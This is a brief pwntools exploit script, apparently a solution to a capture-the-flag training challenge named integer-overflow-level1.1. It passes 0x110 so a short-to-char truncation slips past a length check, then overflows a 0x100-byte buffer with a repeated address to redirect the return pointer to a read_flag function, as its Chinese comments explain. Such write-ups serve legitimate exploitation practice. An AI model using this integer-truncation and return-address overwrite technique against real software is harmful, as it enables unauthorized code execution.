from pwn import *
# set 
context(arch="amd64", os="linux", log_level="debug")
# excute
challenge_path = "/challenge/integer-overflow-level1.1"
p = process(challenge_path)

# create string
read_flag=b'\xab\x12\x40\x00\x00\x00\x00\x00'
shuzi=int(0x0110)
payload=read_flag*34
p.sendlineafter("Give me your input\n",str(shuzi))
p.sendlineafter("Give me your payload\n",payload)
# 接收题目的输出
result = p.recvall()

# 打印题目的输出
print(result)
'''
输入一个数，short转char，要求char小于80且不等于short，高位不为0即可
然后输入short个字节，通过溢出0x100大小的buf将rip地址修改为read_flag地址
'''